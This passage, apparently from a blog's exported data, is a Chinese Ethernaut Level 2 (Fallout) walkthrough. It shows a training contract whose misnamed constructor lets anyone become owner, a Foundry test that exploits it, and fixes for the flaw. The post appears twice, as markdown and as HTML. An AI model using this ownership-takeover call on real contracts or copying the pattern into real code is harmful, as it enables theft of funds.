instance.owner());\n        console.log(\"Attacker address:\", attacker);\n        \n        // 攻击步骤：直接调用错误命名的\"构造函数\"\n        instance.Fal1out{value: 0.001 ether}();\n        \n        // 验证攻击成功\n        assertEq(instance.owner(), attacker);\n        console.log(\"New owner:\", instance.owner());\n        \n        vm.stopPrank();\n    }\n    \n    function testOriginalOwnerIsZero() public view {\n        // 验证合约部署后没有owner（因为构造函数未执行）\n        assertEq(instance.owner(), address(0));\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行 Fallout 关卡测试\nforge test --match-contract FalloutTest -vvv\n\n# 预期输出：\n# [PASS] testFalloutExploit()\n# [PASS] testOriginalOwnerIsZero()\n```\n\n## 🛡️ 防御措施\n\n### 现代 Solidity 解决方案\n\n从 **Solidity 0.4.22** 开始，引入了 `constructor` 关键字：\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract SecureFallout {\n    address public owner;\n    mapping (address => uint) allocations;\n    \n    // ✅ 使用 constructor 关键字\n    constructor() {\n        owner = msg.sender;\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n    \n    // 其他函数...\n}\n```\n\n### 安全最佳实践\n\n1. **使用现代语法**\n```solidity\n// ❌ 旧版本（容易出错）\nfunction ContractName() public {\n    // 构造逻辑\n}\n\n// ✅ 新版本（明确且安全）\nconstructor() {\n    // 构造逻辑\n}\n```\n\n2. **代码审计检查清单**\n```solidity\n// 检查项目：\n// ✅ 构造函数名称与合约名称是否完全匹配\n// ✅ 是否使用了现代 constructor 语法\n// ✅ 是否有多个类似构造函数的函数\n// ✅ 权限初始化是否正确执行\n```\n\n3. **编译器警告**\n```bash\n# 现代编译器会对可疑的函数名发出警告\nWarning: Function state mutability can be restricted to pure\nWarning: This function has the same name as the contract\n```\n\n## 📚 核心知识点\n\n### 1. Solidity 版本演进\n\n| 版本 | 构造函数语法 | 安全性 |\n|------|------------|--------|\n| < 0.4.22 | `function ContractName()` | ❌ 容易拼写错误 |\n| >= 0.4.22 | `constructor()` | ✅ 明确且安全 |\n\n### 2. 常见命名错误\n\n```solidity\ncontract MyContract {\n    // ❌ 常见错误类型\n    function MyContracr() public { }  // 拼写错误\n    function myContract() public { }  // 大小写错误\n    function MyContract_() public { } // 多余字符\n    function MyContract() public { }  // 可能正确，但不推荐\n}\n```\n\n### 3. 代码审计重点\n\n- **字符相似性检查** - 1 vs l, 0 vs O\n- **大小写敏感性** - Solidity 区分大小写\n- **额外字符检查** - 下划线、空格等\n- **编码问题** - Unicode 字符混用\n\n## 🔍 实际案例分析\n\n### 历史上的类似漏洞\n\n1. **Rubixi 智能合约** (2016)\n   - 合约从 `DynamicPyramid` 重命名为 `Rubixi`\n   - 忘记更新构造函数名称\n   - 导致任何人都可以成为 owner\n\n2. **其他类似案例**\n   - 复制粘贴代码时忘记修改函数名\n   - 团队协作中的沟通失误\n   - 自动化重构工具的缺陷\n\n### 漏洞影响评估\n\n- **直接影响**: 完全丧失合约控制权\n- **资金风险**: 合约中的所有资金\n- **修复难度**: 无法修复，需要重新部署\n- **检测难度**: 极低，但容易被忽视\n\n## 🎯 总结\n\nFallout 关卡展示了一个看似微不足道但后果严重的漏洞：\n\n- ✅ **细节决定成败** - 一个字符的差异导致完全不同的结果\n- ✅ **工具的重要性** - 现代编译器和工具可以避免此类错误\n- ✅ **代码审计的价值** - 人工审计能发现工具遗漏的问题\n- ✅ **版本升级的必要性** - 使用最新的安全特性\n\n这个案例提醒我们，在智能合约开发中，**没有小错误，只有大损失**。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**\n- **[下一关: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*魔鬼藏在细节中，安全始于每一个字符。* 🔍","slug":"ethernaut-level-02-fallout","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zboy0009bf5q0im60usu","content":"<h1 id=\"🎯-Ethernaut-Level-2-Fallout-构造函数命名漏洞\"><a href=\"#🎯-Ethernaut-Level-2-Fallout-构造函数命名漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞\"></a>🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/2\">Ethernaut Level 2 - Fallout</a><br><strong>攻击类型</strong>: 构造函数命名错误、历史漏洞<br><strong>难度</strong>: ⭐☆☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这个关卡考查的是开发者在代码编写中的细心程度：</p>\n<ol>\n<li><strong>获取合约控制权</strong> - 成为合约的 <code>owner</code></li>\n<li><strong>理解历史漏洞</strong> - 学习 Solidity 早期版本的安全问题</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Fallout &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    using SafeMath for uint256;</span><br><span class=\"line\">    mapping (address =&gt; uint) allocations;</span><br><span class=\"line\">    address payable public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* constructor */</span><br><span class=\"line\">    function Fal1out() public payable &#123;  // 🚨 注意这里的拼写！</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        allocations[owner] = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function allocate() public payable &#123;</span><br><span class=\"line\">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function sendAllocation(address payable allocator) public &#123;</span><br><span class=\"line\">        require(allocations[allocator] &gt; 0);</span><br><span class=\"line\">        allocator.transfer(allocations[allocator]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function collectAllocations() public onlyOwner &#123;</span><br><span class=\"line\">        msg.sender.transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class=\"line\">        return allocations[allocator];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p>仔细观察合约代码，我们发现一个<strong>极其微妙但致命的错误</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 合约名称</span><br><span class=\"line\">contract Fallout &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* constructor */</span><br><span class=\"line\">    function Fal1out() public payable &#123;  // ❌ 这里是 &quot;Fal1out&quot; (数字1)</span><br><span class=\"line\">        owner = msg.sender;             // 而不是 &quot;Fallout&quot; (字母l)</span><br><span class=\"line\">        allocations[owner] = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"历史背景\"><a href=\"#历史背景\" class=\"headerlink\" title=\"历史背景\"></a>历史背景</h3><p>在 <strong>Solidity 0.4.22</strong> 之前，构造函数的定义方式是：</p>\n<ul>\n<li>创建一个与合约名称<strong>完全相同</strong>的函数</li>\n<li>该函数会在合约部署时自动执行一次</li>\n</ul>\n<p>但在这个合约中：</p>\n<ul>\n<li>合约名称是 <code>Fallout</code>（字母 l）</li>\n<li>函数名称是 <code>Fal1out</code>（数字 1）</li>\n</ul>\n<p><strong>结果</strong>: 这个函数不是构造函数，而是一个<strong>普通的公开函数</strong>！</p>\n<h3 id=\"攻击路径\"><a href=\"#攻击路径\" class=\"headerlink\" title=\"攻击路径\"></a>攻击路径</h3><ol>\n<li><strong>识别伪装的构造函数</strong> - 发现 <code>Fal1out()</code> 函数可以被任何人调用</li>\n<li><strong>直接调用函数</strong> - 调用 <code>Fal1out()</code> 成为 <code>owner</code></li>\n<li><strong>验证权限获取</strong> - 确认已获得合约控制权</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Fallout.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract FalloutTest is Test &#123;</span><br><span class=\"line\">    Fallout public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        instance = new Fallout();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给攻击者一些初始资金</span><br><span class=\"line\">        vm.deal(attacker, 1 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testFalloutExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Original owner:&quot;, instance.owner());</span><br><span class=\"line\">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 攻击步骤：直接调用错误命名的&quot;构造函数&quot;</span><br><span class=\"line\">        instance.Fal1out&#123;value: 0.001 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(instance.owner(), attacker);</span><br><span class=\"line\">        console.log(&quot;New owner:&quot;, instance.owner());</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testOriginalOwnerIsZero() public view &#123;</span><br><span class=\"line\">        // 验证合约部署后没有owner（因为构造函数未执行）</span><br><span class=\"line\">        assertEq(instance.owner(), address(0));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行 Fallout 关卡测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract FalloutTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 预期输出：</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testFalloutExploit()</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testOriginalOwnerIsZero()</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"现代-Solidity-解决方案\"><a href=\"#现代-Solidity-解决方案\" class=\"headerlink\" title=\"现代 Solidity 解决方案\"></a>现代 Solidity 解决方案</h3><p>从 <strong>Solidity 0.4.22</strong> 开始，引入了 <code>constructor</code> 关键字：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureFallout &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    mapping (address =&gt; uint) allocations;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ✅ 使用 constructor 关键字</span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 其他函数...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安全最佳实践\"><a href=\"#安全最佳实践\" class=\"headerlink\" title=\"安全最佳实践\"></a>安全最佳实践</h3><ol>\n<li><p><strong>使用现代语法</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 旧版本（容易出错）</span><br><span class=\"line\">function ContractName() public &#123;</span><br><span class=\"line\">    // 构造逻辑</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 新版本（明确且安全）</span><br><span class=\"line\">constructor() &#123;</span><br><span class=\"line\">    // 构造逻辑</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>代码审计检查清单</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 检查项目：</span><br><span class=\"line\">// ✅ 构造函数名称与合约名称是否完全匹配</span><br><span class=\"line\">// ✅ 是否使用了现代 constructor 语法</span><br><span class=\"line\">// ✅ 是否有多个类似构造函数的函数</span><br><span class=\"line\">// ✅ 权限初始化是否正确执行</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>编译器警告</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 现代编译器会对可疑的函数名发出警告</span></span><br><span class=\"line\">Warning: Function state mutability can be restricted to pure</span><br><span class=\"line\">Warning: This <span class=\"keyword\">function</span> has the same name as the contract</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-Solidity-版本演进\"><a href=\"#1-Solidity-版本演进\" class=\"headerlink\" title=\"1. Solidity 版本演进\"></a>1. Solidity 版本演进</h3><table>\n<thead>\n<tr>\n<th>版本</th>\n<th>构造函数语法</th>\n<th>安全性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt; 0.4.22</td>\n<td><code>function ContractName()</code></td>\n<td>❌ 容易拼写错误</td>\n</tr>\n<tr>\n<td>&gt;&#x3D; 0.4.22</td>\n<td><code>constructor()</code></td>\n<td>✅ 明确且安全</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-常见命名错误\"><a href=\"#2-常见命名错误\" class=\"headerlink\" title=\"2. 常见命名错误\"></a>2. 常见命名错误</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MyContract &#123;</span><br><span class=\"line\">    // ❌ 常见错误类型</span><br><span class=\"line\">    function MyContracr() public &#123; &#125;  // 拼写错误</span><br><span class=\"line\">    function myContract() public &#123; &#125;  // 大小写错误</span><br><span class=\"line\">    function MyContract_() public &#123; &#125; // 多余字符</span><br><span class=\"line\">    function MyContract() public &#123; &#125;  // 可能正确，但不推荐</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-代码审计重点\"><a href=\"#3-代码审计重点\" class=\"headerlink\" title=\"3. 代码审计重点\"></a>3. 代码审计重点</h3><ul>\n<li><strong>字符相似性检查</strong> - 1 vs l, 0 vs O</li>\n<li><strong>大小写敏感性</strong> - Solidity 区分大小写</li>\n<li><strong>额外字符检查</strong> - 下划线、空格等</li>\n<li><strong>编码问题</strong> - Unicode 字符混用</li>\n</ul>\n<h2 id=\"🔍-实际案例分析\"><a href=\"#🔍-实际案例分析\" class=\"headerlink\" title=\"🔍 实际案例分析\"></a>🔍 实际案例分析</h2><h3 id=\"历史上的类似漏洞\"><a href=\"#历史上的类似漏洞\" class=\"headerlink\" title=\"历史上的类似漏洞\"></a>历史上的类似漏洞</h3><ol>\n<li><p><strong>Rubixi 智能合约</strong> (2016)</p>\n<ul>\n<li>合约从 <code>DynamicPyramid</code> 重命名为 <code>Rubixi</code></li>\n<li>忘记更新构造函数名称</li>\n<li>导致任何人都可以成为 owner</li>\n</ul>\n</li>\n<li><p><strong>其他类似案例</strong></p>\n<ul>\n<li>复制粘贴代码时忘记修改函数名</li>\n<li>团队协作中的沟通失误</li>\n<li>自动化重构工具的缺陷</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"漏洞影响评估\"><a href=\"#漏洞影响评估\" class=\"headerlink\" title=\"漏洞影响评估\"></a>漏洞影响评估</h3><ul>\n<li><strong>直接影响</strong>: 完全丧失合约控制权</li>\n<li><strong>资金风险</strong>: 合约中的所有资金</li>\n<li><strong>修复难度</strong>: 无法修复，需要重新部署</li>\n<li><strong>检测难度</strong>: 极低，但容易被忽视</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Fallout 关卡展示了一个看似微不足道但后果严重的漏洞：</p>\n<ul>\n<li>✅ <strong>细节决定成败</strong> - 一个字符的差异导致完全不同的结果</li>\n<li>✅ <strong>工具的重要性</strong> - 现代编译器和工具可以避免此类错误</li>\n<li>✅ <strong>代码审计的价值</strong> - 人工审计能发现工具遗漏的问题</li>\n<li>✅ <strong>版本升级的必要性</strong> - 使用最新的安全特性</li>\n</ul>\n<p>这个案例提醒我们，在智能合约开发中，<strong>没有小错误，只有大损失</strong>。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">上一关: Level 1 - Fallback</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">下一关: Level 3 - Coin Flip</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>魔鬼藏在细节中，安全始于每一个字符。</em> 🔍</p>\n","more":"<h1 id=\"🎯-Ethernaut-Level-2-Fallout-构造函数命名漏洞\"><a href=\"#🎯-Ethernaut-Level-2-Fallout-构造函数命名漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞\"></a>🎯 Ethernaut Level 2: Fallout - 构造函数命名漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/2\">Ethernaut Level 2 - Fallout</a><br><strong>攻击类型</strong>: 构造函数命名错误、历史漏洞<br><strong>难度</strong>: ⭐☆☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这个关卡考查的是开发者在代码编写中的细心程度：</p>\n<ol>\n<li><strong>获取合约控制权</strong> - 成为合约的 <code>owner</code></li>\n<li><strong>理解历史漏洞</strong> - 学习 Solidity 早期版本的安全问题</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Fallout &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    using SafeMath for uint256;</span><br><span class=\"line\">    mapping (address =&gt; uint) allocations;</span><br><span class=\"line\">    address payable public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* constructor */</span><br><span class=\"line\">    function Fal1out() public payable &#123;  // 🚨 注意这里的拼写！</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        allocations[owner] = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier onlyOwner &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function allocate() public payable &#123;</span><br><span class=\"line\">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function sendAllocation(address payable allocator) public &#123;</span><br><span class=\"line\">        require(allocations[allocator] &gt; 0);</span><br><span class=\"line\">        allocator.transfer(allocations[allocator]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function collectAllocations() public onlyOwner &#123;</span><br><span class=\"line\">        msg.sender.transfer(address(this).balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class=\"line\">        return allocations[allocator];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p>仔细观察合约代码，我们发现一个<strong>极其微妙但致命的错误</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 合约名称</span><br><span class=\"line\">contract Fallout &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /* constructor */</span><br><span class=\"line\">    function Fal1out() public payable &#123;  // ❌ 这里是 &quot;Fal1out&quot; (数字1)</span><br><span class=\"line\">        owner = msg.sender;             // 而不是 &quot;Fallout&quot; (字母l)</span><br><span class=\"line\">        allocations[owner] = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"历史背景\"><a href=\"#历史背景\" class=\"headerlink\" title=\"历史背景\"></a>历史背景</h3><p>在 <strong>Solidity 0.4.22</strong> 之前，构造函数的定义方式是：</p>\n<ul>\n<li>创建一个与合约名称<strong>完全相同</strong>的函数</li>\n<li>该函数会在合约部署时自动执行一次</li>\n</ul>\n<p>但在这个合约中：</p>\n<ul>\n<li>合约名称是 <code>Fallout</code>（字母 l）</li>\n<li>函数名称是 <code>Fal1out</code>（数字 1）</li>\n</ul>\n<p><strong>结果</strong>: 这个函数不是构造函数，而是一个<strong>普通的公开函数</strong>！</p>\n<h3 id=\"攻击路径\"><a href=\"#攻击路径\" class=\"headerlink\" title=\"攻击路径\"></a>攻击路径</h3><ol>\n<li><strong>识别伪装的构造函数</strong> - 发现 <code>Fal1out()</code> 函数可以被任何人调用</li>\n<li><strong>直接调用函数</strong> - 调用 